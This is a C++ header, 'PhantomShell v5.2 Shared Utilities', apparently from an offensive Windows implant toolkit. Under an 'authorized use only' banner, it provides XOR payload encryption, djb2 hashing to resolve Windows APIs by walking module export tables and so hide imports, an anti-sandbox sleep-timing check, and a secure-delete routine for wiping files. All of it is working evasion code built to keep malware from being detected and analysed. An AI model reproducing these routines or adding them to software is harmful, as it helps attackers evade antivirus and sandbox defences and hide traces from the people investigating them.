/*
 * PhantomShell v5.2 — Shared Utilities
 * AUTHORIZED USE ONLY: This tool is for authorized security testing and research.
 * Unauthorized access to computer systems is illegal.
 *
 * Hex conversion, XOR crypto, djb2 hashing, dynamic API resolution.
 */

#pragma once

#ifndef PHANTOM_UTILS_H
#define PHANTOM_UTILS_H

#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include <sstream>
#include <iomanip>
#include <fstream>

namespace PhantomUtils {

// --------------------------------------------------------------------------
// Hex string <-> bytes conversion
// --------------------------------------------------------------------------
inline std::string BytesToHex(const uint8_t* data, size_t len) {
    std::ostringstream oss;
    for (size_t i = 0; i < len; i++) {
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(data[i]);
    }
    return oss.str();
}

inline std::string BytesToHex(const std::vector<uint8_t>& data) {
    return BytesToHex(data.data(), data.size());
}

inline std::vector<uint8_t> HexToBytes(const std::string& hex) {
    std::vector<uint8_t> bytes;
    bytes.reserve(hex.size() / 2);
    for (size_t i = 0; i + 1 < hex.size(); i += 2) {
        uint8_t byte = static_cast<uint8_t>(std::stoi(hex.substr(i, 2), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// --------------------------------------------------------------------------
// XOR encrypt/decrypt (symmetric — same operation for both)
// --------------------------------------------------------------------------
inline void XorCrypt(uint8_t* data, size_t dataLen, const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < dataLen; i++) {
        data[i] ^= key[i % keyLen];
    }
}

inline void XorCrypt(std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    XorCrypt(data.data(), data.size(), key.data(), key.size());
}

inline void XorCrypt(std::vector<uint8_t>& data, const std::string& key) {
    XorCrypt(data.data(), data.size(),
             reinterpret_cast<const uint8_t*>(key.data()), key.size());
}

inline std::vector<uint8_t> XorCryptCopy(const std::vector<uint8_t>& data,
                                          const std::string& key) {
    std::vector<uint8_t> result = data;
    XorCrypt(result, key);
    return result;
}

// --------------------------------------------------------------------------
// djb2 string hash — used for API name hashing
// --------------------------------------------------------------------------
constexpr uint32_t Djb2Hash(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str);
        str++;
    }
    return hash;
}

// Runtime version for non-constexpr contexts
inline uint32_t Djb2HashRuntime(const char* str) {
    uint32_t hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str);
        str++;
    }
    return hash;
}

// --------------------------------------------------------------------------
// Dynamic API resolution via hashed export names
// Walks the export table of a module, hashes each name with djb2,
// and returns the function pointer when the hash matches.
// --------------------------------------------------------------------------
inline FARPROC GetProcAddressByHash(HMODULE hModule, uint32_t targetHash) {
    if (!hModule) return nullptr;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return nullptr;

    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uint8_t*>(hModule) + exportDir.VirtualAddress);

    auto names = reinterpret_cast<DWORD*>(
        reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNames);
    auto ordinals = reinterpret_cast<WORD*>(
        reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<DWORD*>(
        reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        auto funcName = reinterpret_cast<const char*>(
            reinterpret_cast<uint8_t*>(hModule) + names[i]);

        if (Djb2HashRuntime(funcName) == targetHash) {
            return reinterpret_cast<FARPROC>(
                reinterpret_cast<uint8_t*>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Resolve from module name string
inline FARPROC ResolveAPIByHash(const char* moduleName, uint32_t funcHash) {
    HMODULE hMod = GetModuleHandleA(moduleName);
    if (!hMod) {
        hMod = LoadLibraryA(moduleName);
    }
    if (!hMod) return nullptr;
    return GetProcAddressByHash(hMod, funcHash);
}

// --------------------------------------------------------------------------
// File I/O helpers
// --------------------------------------------------------------------------
inline std::vector<uint8_t> ReadFileBytes(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return {};
    }
    return buffer;
}

inline bool WriteFileBytes(const std::string& path, const std::vector<uint8_t>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(reinterpret_cast<const char*>(data.data()),
               static_cast<std::streamsize>(data.size()));
    return file.good();
}

inline bool WriteFileBytes(const std::string& path, const uint8_t* data, size_t len) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(reinterpret_cast<const char*>(data), static_cast<std::streamsize>(len));
    return file.good();
}

// --------------------------------------------------------------------------
// Error reporting helper
// --------------------------------------------------------------------------
inline void PrintError(const char* context) {
    DWORD err = GetLastError();
    char buf[512];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr, err, 0, buf, sizeof(buf), nullptr);
    fprintf(stderr, "[!] %s failed — error %lu: %s", context, err, buf);
}

inline void PrintNtError(const char* context, LONG status) {
    fprintf(stderr, "[!] %s failed — NTSTATUS: 0x%08lX\n", context, status);
}

// --------------------------------------------------------------------------
// Anti-sandbox: sleep and verify time actually elapsed
// Returns false if the system fast-forwarded the sleep (sandbox behavior).
// --------------------------------------------------------------------------
inline bool AntiSandboxSleep(DWORD milliseconds) {
    ULONGLONG t1 = GetTickCount64();
    Sleep(milliseconds);
    ULONGLONG t2 = GetTickCount64();
    // Allow 20% tolerance — sandboxes often skip sleep entirely
    return (t2 - t1) >= (milliseconds * 80 / 100);
}

// --------------------------------------------------------------------------
// Timestamp string for filenames (YYYYMMDD_HHMMSS)
// --------------------------------------------------------------------------
inline std::string GetTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[32];
    snprintf(buf, sizeof(buf), "%04d%02d%02d_%02d%02d%02d",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    return std::string(buf);
}

// --------------------------------------------------------------------------
// Secure file overwrite before deletion
// --------------------------------------------------------------------------
inline bool SecureDelete(const std::string& path) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (GetFileSizeEx(hFile, &fileSize)) {
        // Overwrite with zeros
        std::vector<uint8_t> zeros(4096, 0);
        LONGLONG remaining = fileSize.QuadPart;
        while (remaining > 0) {
            DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(zeros.size()), remaining));
            DWORD written = 0;
            WriteFile(hFile, zeros.data(), toWrite, &written, nullptr);
            remaining -= written;
            if (written == 0) break;
        }
        FlushFileBuffers(hFile);
    }
    CloseHandle(hFile);
    return DeleteFileA(path.c_str()) != 0;
}

} // namespace PhantomUtils

#endif // PHANTOM_UTILS_H
